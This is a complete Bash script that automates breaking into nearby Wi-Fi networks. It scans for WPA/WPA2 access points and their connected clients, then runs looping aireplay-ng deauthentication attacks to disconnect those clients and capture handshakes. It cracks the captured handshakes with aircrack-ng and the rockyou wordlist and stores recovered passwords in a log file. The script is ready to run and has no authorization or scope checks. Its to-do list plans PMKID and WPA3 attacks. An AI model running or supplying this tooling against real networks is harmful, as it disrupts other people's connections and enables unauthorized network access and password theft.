#!/bin/bash

# version: 3.0 11/1/25 18:04


### To Do ###
# option to run all networks or range of them at the same time.
# use differenet dictioneries than rockyou
# Hushcut - GPU
# Find attack for WPA2-WPA3, WPA3
# PMKID, HXC..



# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path And OUI file for vendors name of devices and routers (will help identify farther attacks).

# **IMPORTANT** for Alfa AWUS036AXML wifi card don't run apt upgrade. or else the card won't work (I couldn't solve it with the Linux drivers that Alfa offered).
# To enable 6Ghz run: "sudo iw reg set US" and reboot. to check if its enabled run: "iw list".





# ------------------------------
# Variables
# ------------------------------
UN=${SUDO_USER:-$(whoami)}
current_date=$(date +"%d_%m_%y")
targets_path="/home/$UN/Desktop/wifi_Targets"
scan_input="$targets_path/Scan/Scan-$current_date.csv"
wordlists_dir="/usr/share/wordlists"
rockyou_file="$wordlists_dir/rockyou.txt"
rockyou_gz="$wordlists_dir/rockyou.txt.gz"
oui_file="$targets_path/oui.txt"
oui_vendor=""
gpu_enabled=false # function not exist yet

# Ensure required directories exist
mkdir -p "$targets_path"
if [ -d "$targets_path/Scan" ]; then
    rm -rf "$targets_path/Scan"
fi
mkdir "$targets_path/Scan"
touch "$targets_path/wifi_passwords.txt"	    
sudo chown -R $UN:$UN $targets_path



# ------------------------------
# Dependencies Installation
# ------------------------------
function install_dependencies() {
    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "dbus-x11")
    for package in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $package "; then
            sudo apt update
            echo "$package is not installed. Installing..."
            sudo apt install -y $package
        fi
    done
}



# ------------------------------
# Check Wordlist and OUI file
# ------------------------------
function check_wordlist() {
    # Check if /usr/share/wordlist directory exists, if not, create it
    if [ ! -d "$wordlists_dir" ]; then
        sudo mkdir -p "$wordlists_dir"
        echo "wordlist folder created"
    fi
    # Check if rockyou.txt exists, if yes, continue code
    if [ -f "$rockyou_file" ]; then
        echo
    else
        # Check if rockyou.gz exists, if yes, unzip it
        if [ -f "$rockyou_gz" ]; then
            echo "rockyou.gz found. Unzipping..."
            sudo gzip -d "$rockyou_gz"
        else
            echo -e "Downloading the rockyou file...\n"
            sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
            wait
        fi
    fi
    
    # Check if oui.txt exists - for vendors names
    if [ -f "$oui_file" ]; then
        echo
    else
       echo -e "Downloading the OUI file...\n"
       wget -q https://raw.githubusercontent.com/Doksy/OUI-list-2025/main/oui.txt -O  "$targets_path"/oui.txt
       wait
    fi         
}



# ------------------------------
# Adapter Configuration
# ------------------------------
function adapter_config() {
	sudo airmon-ng check kill > /dev/null 2>&1   # kill proccesses that interfere with airmon-ng
	if iwconfig wlan1 &> /dev/null; then
	    wifi_adapter="wlan1"
	elif iw dev wlan1mon info &>/dev/null; then
	    wifi_adapter="wlan1"
	    echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter \nThe adapter in monitor mode."
	    return 0    
	elif iwconfig wlan0 &> /dev/null; then
	    wifi_adapter="wlan0"
	elif iw dev wlan0mon info &>/dev/null; then
	    wifi_adapter="wlan0"
	    echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter \nThe adapter in monitor mode."
	    return 0
	else
	    read -p "WiFi adapter not detected. Please enter the name of your WiFi adapter: " wifi_adapter
	fi  	
	echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter\nStarting $wifi_adapter in monitor mode"
 
	sudo airmon-ng start "$wifi_adapter" > /dev/null 2>&1

 	# Find the new monitor mode adapter name
	mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}')

	if [[ -n "$mon_adapter" ]]; then
		# Extract the original adapter name by removing 'mon' from the end
		wifi_adapter="${mon_adapter%mon}"
		#echo -e "\e[1mMonitor mode adapter:\e[0m $mon_adapter"
		#echo -e "\e[1mOriginal adapter name set to:\e[0m $wifi_adapter"
	else
		echo -e "\e[31mFailed to start monitor mode. Check your adapter and try again.\e[0m"
		return 1
	fi
}



# ------------------------------
# Network Scanner
# ------------------------------
function network_scanner() {	
        # Scan 10 seconds for wifi networks   
        countdown_duration=15
        sudo gnome-terminal --geometry=110x35-10000-10000 -- timeout "$countdown_duration"s sudo airodump-ng --band abg "$wifi_adapter"mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date        

        echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
        for (( i=$countdown_duration; i>=1; i-- )); do
            tput cuu1 && tput el
            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
            sleep 1
        done
        mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
        cp "$scan_input" "$scan_input.original"
        
	# Extract client MAC and associated BSSID from the original scan without displaying them
	clients_content=$(awk -F, '/Station MAC/ {flag=1; next} flag && $1 ~ /:/ {client_mac=$1; bssid=$6; if (bssid !~ /(not associated)/) printf "%-22s %s\n", client_mac, bssid}' "$scan_input.original")

	# Edit original scan file to a more organized format
	awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $9, $14}' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Extract relevant fields
	awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"           # Delete the clients part
	awk -F',' '$NF ~ /\S/' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                # Delete networks without names
	tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the header
	head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the footer
	awk -F, '{ gsub(/^ */, "", $0); gsub(/ *$/, "", $0); print $0 }' "$scan_input" | sort -t, -k4,4nr -k5 > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Sort by power and name

	# Append the client information to the end of the scan file
	echo -e "\nStation MAC:            BSSID:\n$clients_content" >> "$scan_input"


	# Display available WiFi networks
	echo -e "\n\033[1;33mAvailable WiFi Networks:\033[0m\n"

	# Display the scan input file contents with row numbers
	printf "      Name: %-30s Clients: %-2s Encryption: %-4s Channel: %-3s Power: %-3s BSSID: %-12s Vendor: %-1s\n\n"
	declare -A client_counts
	while IFS= read -r client_line; do
	    bssid=$(echo "$client_line" | awk '{print $2}')
	    ((client_counts["$bssid"]++))
	done <<< "$clients_content"

	# Process and display only the WiFi network section (exclude the Station MAC section)
	awk '/^Station MAC/ {exit} {print}' "$scan_input" | nl -w2 -s', ' | awk -F', ' '{print $0}' | while read -r line; do
	    # Skip empty lines
	    if [[ -z "$line" ]]; then
		continue
	    fi
	    index=$(echo "$line" | cut -d',' -f1 | xargs)
	    mac=$(echo "$line" | cut -d',' -f2 | xargs)
	    channel=$(echo "$line" | cut -d',' -f3 | xargs)
	    encryption=$(echo "$line" | cut -d',' -f4 | xargs)
	    power=$(echo "$line" | cut -d',' -f5 | xargs)
	    ssid=$(echo "$line" | cut -d',' -f6)
	    
	    # Get the vendor dynamically
	    vendor=$(get_oui_vendor_scan "$mac")
	    # Get the number of clients for this BSSID
	    client_count=${client_counts["$mac"]}
	    clients_display=""
	    if [[ -n "$client_count" ]]; then
		clients_display="+$client_count"
	    fi
	    if [[ -n "$vendor" ]]; then
		printf "%-4s %-38s %-10s %-16s %-12s %-10s %-19s %-1s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption" "$channel" "$power" "$mac" "$vendor"
	    else
		printf "%-4s %-38s %-10s %-16s %-12s %-10s %-5s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption" "$channel" "$power" "$mac"
	    fi
	done
	echo
        
        num_rows=$(awk '/Station MAC/ {exit} NF {count++} END {print count}' "$scan_input") # Calculate the number of valid rows (above the empty line before "Station MAC")
		    	    
        choose_network
        
}


function choose_network() {
    while :; do
        # Prompt the user to choose a row number
        read -p "Enter row number: " row_number
        echo
        # Keep asking for a valid row number
        while :; do
            re='^[0-9]+$'
            if ! [[ $row_number =~ $re ]]; then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
            elif (( row_number < 1 || row_number > num_rows )); then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
            else
                break
            fi
            echo
            read -p "Enter row number: " row_number
            echo
        done

        # Extracting values from airodump-ng scan file
        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
        power=$(echo "$chosen_row" | awk -F', ' '{print $4}')
        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $5}')

        # Remove "/" from bssid name
        if [[ $bssid_name == *"/"* ]]; then
            bssid_name=${bssid_name//\//}
        fi

        get_oui_vendor

        # Echo values
        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
        if [[ -n "$oui_vendor" ]]; then
            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address - $oui_vendor"
        else
            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
        fi

        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
        else
            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
        fi
        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
        echo -e "\033[1;31m\033[1mPower:\033[0m $power"        
        echo
        echo

        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1mThe Network is open.\033[0m"
            echo -e "Choose different Network..\n"
            continue  
        elif [[ "$encryption" == *WPA3* ]]; then
            echo -e "\033[1mThe encryption is "$encryption". This script can't crack it yet.\033[0m"
            echo -e "Choose different Network..\n"
            continue 
        fi

        # Check if we already have the Wi-Fi password for this BSSID
        if sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The wifi password is:"; then
            wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The wifi password is:" | awk -F': ' '{print $2}' | xargs)
            echo -e "\033[1;32mPassword already exists for this network!\033[0m"
            echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
            echo -e "Choose different Network..\n"
            continue 
        fi

        # Check if this BSSID was previously marked as failed    
        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not found in rockyou.txt"; then
            echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in rockyou.txt file.\033[0m\n" 
            echo -e "Choose different Network..\n"
            continue 
        fi

        # If we only captured the handshake from previous scan
        if [ -d "$targets_path/$bssid_name" ]; then
            if sudo grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
                echo -e "\033[1;32mHandshake found from previous scan! Cracking it..\033[0m\n"
                sudo pkill aireplay-ng
                sudo pkill airodump-ng
                cleanup
                dictionary_attack
                exit 1   
            else
                rm -r $targets_path/"$bssid_name" 
                mkdir $targets_path/"$bssid_name"           
            fi   
        else
            mkdir $targets_path/"$bssid_name"           
        fi

        # Validate network
        validate_network
        break  # Exit the loop once a valid network is chosen
    done
}






function validate_network() {

        echo -e "\e[1mValidating network:\e[0m"
        gnome-terminal --geometry=105x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
	found=0
	for (( i=0; i<10; i++ )); do
	    if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
		found=1
		echo -e "Network available! \n"
		break
	    fi
	    sleep 1
	done

	if [ $found -eq 0 ]; then
	    sudo pkill aireplay-ng
	    sudo pkill airodump-ng
	    echo -e "\033[1mNetwork appears to be offline now.\033[0m"
	    another_scan_prompt
	fi
}




# ------------------------------------
# Get the vendors names of the devices
# ------------------------------------
function get_oui_vendor_scan() {
    local mac="$1"
    local oui=$(echo "$mac" | awk -F':' '{print toupper($1 ":" $2 ":" $3)}') # Extract OUI in uppercase
    if [[ -f $oui_file ]]; then
        # Get the vendor name if it exists
        local vendor=$(grep -i "^$oui" "$oui_file" | awk '{$1=""; print $0}' | xargs | tr -d '\r')
        echo "$vendor"
    else
        echo ""
    fi
}
# Function to check the OUI and get the vendor name
function get_oui_vendor() {
    local oui=$(echo "$bssid_address" | awk -F':' '{print toupper($1 ":" $2 ":" $3)}') # Extract OUI in uppercase
    if [[ -f $oui_file ]]; then
        oui_vendor=$(grep -i "^$oui" "$oui_file" | awk '{$1=""; print $0}' | xargs)
    else
        oui_vendor=""
    fi
}



# ------------------------------
# Dvices Scanner
# ------------------------------
function devices_scanner() {
	echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
	for ((i=1; i<=10; i++)); do
	    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
	    if [ -n "$target_devices" ]; then
		# Print Devices_Found with vendor names
		echo -e "\033[1;33m\nDevices_Found:\033[0m" 
		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
		    if [[ -n "$mac" ]]; then
			# Call the function to get the vendor
			vendor=$(get_oui_vendor_scan "$mac")
			if [[ -n "$vendor" ]]; then
			    echo -e "$mac - $vendor"
			else
			    echo -e "$mac"
			fi
		    fi
		done		
		echo
		break
	    fi
	    echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
	    sleep 6
	done
	if [ -z "$target_devices" ]; then
	    echo -e "\033[1m\nNo device were found.\033[0m"
	    sudo pkill airodump-ng
	    rm -r $targets_path/"$bssid_name"
	    another_scan_prompt
	fi
	sleep 3
}



# ------------------------------
# Deauth Attack  
# ------------------------------
function deauth_attack() {
	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
	    # trying 10 times (3 minutes) the deauth attack
	    for ((i=1; i<=10; i++)); do        
		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
		for target_device in $target_devices; do
		    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
		done		
		echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         			
		# Print MAC addresses with vendor names
		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
		    if [[ -n "$mac" ]]; then
			# Call the function to get the vendor
			vendor=$(get_oui_vendor_scan "$mac")
			# Print the MAC with its vendor
			if [[ -n "$vendor" ]]; then
			    echo "$mac - $vendor"
			else
			    echo "$mac"
			fi
		    fi
		done	
		echo
		# waiting 18 sec after deauth attack while looking for handshake:
		for ((j=1; j<=18; j++)); do
		    sleep 1
		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
		        echo -e "\033[1;32m->> Got the handshake!\033[0m"
		        sudo pkill aireplay-ng
			sudo pkill airodump-ng
			echo
			echo --- >> $targets_path/wifi_passwords.txt
			#echo -e "We got handshake for ($bssid_address): $bssid_name                       at $(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
			printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"

			break 2
		    fi    
		done
	    # after 10 unseccessfull attempts, quit the script:
	    if [ "$i" == 10 ]; then
	    	echo -e "\033[1m\nNo handshake obtained within 2 minutes. Try again.\033[0m"
	    	sudo pkill aireplay-ng
		sudo pkill airodump-ng
		rm -r $targets_path/"$bssid_name"
		another_scan_prompt
	    fi
	    done       
}



# --------------------------------------------------
# Dictionary Attack - Cracking the Password
# --------------------------------------------------
function dictionary_attack() {
	echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
	sudo aircrack-ng "$targets_path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$targets_path/$bssid_name/$bssid_name-wifi_password.txt"
	echo
	if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
	    wifi_pass=$(cat "$targets_path/$bssid_name/$bssid_name-wifi_password.txt")
	    echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
	    bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
            sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
            rm -r $targets_path/"$bssid_name" 
	    exit 1
	else
	    echo -e "\nCouldn't finf a match from rockyou wordlist.."
	    sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not found in rockyou.txt" "$targets_path/wifi_passwords.txt"
	    another_scan_prompt
	fi
}



# ------------------------------
# GPU Cracking (Hashcat)
# ------------------------------
function gpu_crack() {
    if $gpu_enabled; then
        echo "Starting Hashcat GPU attack..."
        sudo hashcat -m 2500 "$targets_path/$bssid_name/$bssid_name-01.cap" "$rockyou_file" --force
    fi
}



# ------------------------------
# Retry Prompt
# ------------------------------
function another_scan_prompt() {
    while true; do
        echo
        read -p "Do you want to run another scan? (Y/n): " answer
        echo
        case $answer in
            [Yy]* )
                main_process
                break ;;
            [Nn]* )
                echo -e "\nBye."
                cleanup
                exit 1 ;;
            * )
                echo "Invalid input. Please answer yes or no (Y/n)."
                ;;
        esac
    done
}



# ------------------------------
# Cleanup
# ------------------------------
function cleanup() {
	sudo chown -R $UN:$UN $targets_path
	gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop "$wifi_adapter"mon
	gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
}



# ------------------------------
# Main Process
# ------------------------------
function main_process() {
	network_scanner
	devices_scanner
	deauth_attack
	cleanup
	dictionary_attack
	#rm -r $targets_path/"$bssid_name"
}



# ------------------------------
# Script Execution
# ------------------------------
install_dependencies
check_wordlist
adapter_config
main_process



